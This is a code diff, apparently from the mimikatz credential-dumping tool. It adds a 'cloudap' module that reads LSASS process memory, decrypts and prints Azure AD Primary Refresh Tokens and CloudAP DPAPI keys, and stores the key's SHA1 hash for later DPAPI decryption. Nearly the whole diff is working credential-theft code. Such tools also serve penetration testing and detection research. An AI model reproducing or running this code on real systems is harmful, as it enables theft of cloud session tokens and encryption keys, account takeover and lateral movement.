@@ -13,6 +13,7 @@ const KUHL_M_C kuhl_m_c_sekurlsa[] = {
 #if !defined(_M_ARM64)
 	{kuhl_m_sekurlsa_livessp,			L"livessp",			L"Lists LiveSSP credentials"},
 #endif
+	{kuhl_m_sekurlsa_cloudap,			L"cloudap",			L"Lists CloudAp credentials"},
 	{kuhl_m_sekurlsa_ssp,				L"ssp",				L"Lists SSP credentials"},
 	{kuhl_m_sekurlsa_all,				L"logonPasswords",	L"Lists all available providers credentials"},
 
@@ -52,6 +53,7 @@ const PKUHL_M_SEKURLSA_PACKAGE lsassPackages[] = {
 	&kuhl_m_sekurlsa_dpapi_svc_package,
 	&kuhl_m_sekurlsa_credman_package,
 	&kuhl_m_sekurlsa_kdcsvc_package,
+	&kuhl_m_sekurlsa_cloudap_package,
 };
 
 const KUHL_M_SEKURLSA_ENUM_HELPER lsassEnumHelpers[] = {
@@ -241,6 +243,7 @@ NTSTATUS kuhl_m_sekurlsa_acquireLSA()
 						kuhl_m_sekurlsa_livessp_package.isValid = (cLsass.osContext.BuildNumber >= KULL_M_WIN_MIN_BUILD_8);
 					#endif
 						kuhl_m_sekurlsa_tspkg_package.isValid = (cLsass.osContext.MajorVersion >= 6) || (cLsass.osContext.MinorVersion < 2);
+						kuhl_m_sekurlsa_cloudap_package.isValid = (cLsass.osContext.BuildNumber >= KULL_M_WIN_BUILD_10_1909);
 						if(NT_SUCCESS(kull_m_process_getVeryBasicModuleInformations(cLsass.hLsassMem, kuhl_m_sekurlsa_findlibs, NULL)) && kuhl_m_sekurlsa_msv_package.Module.isPresent)
 						{
 							kuhl_m_sekurlsa_dpapi_lsa_package.Module = kuhl_m_sekurlsa_msv_package.Module;
@@ -1069,6 +1072,9 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 	PBYTE lsaIsoOutput;
 	PLSAISO_DATA_BLOB blob = NULL;
 #endif
+	SHA_CTX shaCtx;
+	SHA_DIGEST shaDigest;
+
 	if(mesCreds)
 	{
 		ConvertSidToStringSid(pData->pSid, &sid);
@@ -1166,6 +1172,36 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 					kprintf(L"\n\t * Raw data : ");
 					kull_m_string_wprintf_hex(msvCredentials, ((PUNICODE_STRING) mesCreds)->Length, 1);
 				}
+			}
+		}
+		else if(flags & KUHL_SEKURLSA_CREDS_DISPLAY_CLOUDAP_PRT)
+		{
+			if(mesCreds->UserName.Buffer)
+			{
+				if(kull_m_process_getUnicodeString(&mesCreds->UserName, cLsass.hLsassMem))
+				{
+					if(!(flags & KUHL_SEKURLSA_CREDS_DISPLAY_NODECRYPT)/* && *lsassLocalHelper->pLsaUnprotectMemory*/)
+						(*lsassLocalHelper->pLsaUnprotectMemory)(mesCreds->UserName.Buffer, mesCreds->UserName.MaximumLength);
+					kprintf(L"\n\t     PRT      : %Z", &mesCreds->UserName);
+					LocalFree(mesCreds->UserName.Buffer);
+				}
+			}
+			if(mesCreds->Password.Buffer)
+			{
+				if(!(flags & KUHL_SEKURLSA_CREDS_DISPLAY_NODECRYPT)/* && *lsassLocalHelper->pLsaUnprotectMemory*/)
+					(*lsassLocalHelper->pLsaUnprotectMemory)(mesCreds->Password.Buffer, mesCreds->Password.MaximumLength);
+				A_SHAInit(&shaCtx);
+				A_SHAUpdate(&shaCtx, mesCreds->Password.Buffer, mesCreds->Password.Length);
+				A_SHAFinal(&shaCtx, &shaDigest);
+
+				kprintf(L"\n\t     DPAPI Key: ");
+				kull_m_string_wprintf_hex(mesCreds->Password.Buffer, mesCreds->Password.Length, 0);
+				kprintf(L" (sha1: ");
+				kull_m_string_wprintf_hex(shaDigest.digest, sizeof(shaDigest.digest), 0);
+				kprintf(L")");
+
+				if(sid)
+					kuhl_m_dpapi_oe_credential_add(sid, NULL, NULL, shaDigest.digest, NULL, NULL);
 			}
 		}
 		else if(flags & KUHL_SEKURLSA_CREDS_DISPLAY_PINCODE)
